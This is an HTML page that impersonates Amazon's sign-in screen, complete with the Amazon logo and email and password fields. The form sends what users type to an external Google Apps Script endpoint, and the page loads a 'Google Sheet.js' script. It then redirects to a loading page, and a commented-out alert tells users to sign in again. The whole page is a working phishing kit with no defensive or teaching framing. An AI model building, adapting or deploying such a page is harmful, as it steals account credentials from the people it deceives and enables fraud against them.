<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SignIn A/C</title>
  <link rel="stylesheet" href="mystyle.css">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/5.1.0/mdb.min.css" rel="stylesheet">
</head>
<body>
  <div class="form-container">
    <!-- Amazon logo (Replace the logo path with your own) -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">

    <h2 style="text-align: left;">Sign In</h2>
    <form id="signInForm" action="https://script.google.com/macros/s/AKfycbyDdI11VSbC9BQD4nRHMiTxoOEJWqD6twPWsJII4VazyfPX4XbqGHypHtfo4eJrV3gdBA/exec" method="post"> 
      <!-- Email input -->
      <div data-mdb-input-init class="form-outline"> 
        <label class="form-label" for="form2Example1">Email address</label>
        <input name="email" type="email" id="form2Example1" class="form-control" placeholder="Email address" required />
      </div>

      <!-- Password input -->
      <div data-mdb-input-init class="form-outline">
        <label class="form-label" for="form2Example2">Password</label>
        <input name="password" type="password" id="form2Example2" class="form-control" placeholder="Password" required />
      </div>
      
      <!-- Submit button -->
      <button type="submit" class="btn btn-primary mb-4" id="signInBtn" onclick="window.location.href='load.html';">Sign in</button>

      <!-- 2 column grid layout for inline styling -->
      <div class="row mb-4">
        <div class="col d-flex justify-content-center">
          <!-- Checkbox -->
          <div class="form-check">
            <input class="form-check-input" type="checkbox" value="" id="form2Example31" checked />
            <label class="form-check-label" for="form2Example31"> Remember me </label>
          </div>
        </div>

        <div class="col">
          <!-- Simple link -->
          <a href="#!">Forgot password?</a>
        </div>
      </div>

      <!-- Register buttons -->
      <div class="text-center">
        <p>Not a member? <a href="#!">Register</a></p>
        <p>or sign up with:</p>
        <div class="social-btns">
          <button type="button" class="btn btn-link btn-floating mx-1">
            <i class="fa fa-facebook"></i>
          </button>

          <button type="button" class="btn btn-link btn-floating mx-1">
            <i class="fa fa-google-plus"></i>
          </button>

          <button type="button" class="btn btn-link btn-floating mx-1">
            <i class="fa fa-flickr"></i>
          </button>

          <button type="button" class="btn btn-link btn-floating mx-1">
            <i class="fa fa-instagram"></i>
          </button>
        </div>
      </div>
    </form>
  </div>

  <!-- MDB JS (use your CDN or local path for MDB) -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/5.1.0/mdb.min.js"></script>

  <script>
    // Event listener for the Sign In button
    document.getElementById("signInForm").addEventListener("submit", function(event) {
      event.preventDefault();  // Prevent the form from submitting

      // Get values from the form inputs
      var email = document.getElementById("form2Example1").value;
      var password = document.getElementById("form2Example2").value;

      // Check if email and password are filled in
      if (email && password) {
        // Show popup alert if both fields are filled
        /* alert("Login Issue Again Sign in Amazon Account !"); */ // You can customize this message
      } else {
        // Show popup alert if fields are missing
        alert("Please fill in both email and password.");
      }
    });
  </script>
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T5QV846M"
    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->

    <script src="./js/Google Sheet.js"></script>
</body>
</html>
